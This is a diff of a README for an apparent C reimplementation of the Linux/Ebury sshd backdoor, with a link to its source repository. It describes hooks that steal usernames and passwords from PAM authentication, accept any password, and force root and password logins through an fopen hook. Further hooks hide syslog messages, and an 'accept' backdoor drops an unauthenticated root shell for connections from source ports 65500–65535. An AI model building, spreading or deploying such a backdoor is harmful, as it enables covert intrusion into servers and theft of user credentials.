@@ -1,20 +1,14 @@
-I decided to put actual working C behind Linux/Ebury that's hopefully readable.
+The following hooks work on Kali:
 
-	bad.c contains the constructor (init())
+	__syslog_chk	
+	accept
+	audit_log_acct_message
+	audit_log_user_message
+	fopen
+	read
 
-
-###Working:
-	no use of offsets :^) -- all modular
-
-	basic detection if loaded in sshd
-
-	steal username and password from pam_authenticate
-		allow any password - or choose which password to allow
-
-	always allow PermitRootLogin and PasswordAuthenticate using an fopen() hook
-		simple enough to add more hooks to config options
-
-	basic syslog() and pam_syslog() hooking 
-		just decide what to base message hiding on
+Hooking read to intercept the remote version string and if it matches the hardcoded one it sets the both PermitRootLogin and PasswordAuthentication to yes using the fopen hook and returns PAM_SUCCESS in pam_authenticate.
+Also added the infamous 'accept' backdoor just for fun - drops a root shell if the source port is in the range of 65500-65535. No other checks or encryption for this one because YOLO!
 
 
+Original code: https://github.com/rlbossman/ebury
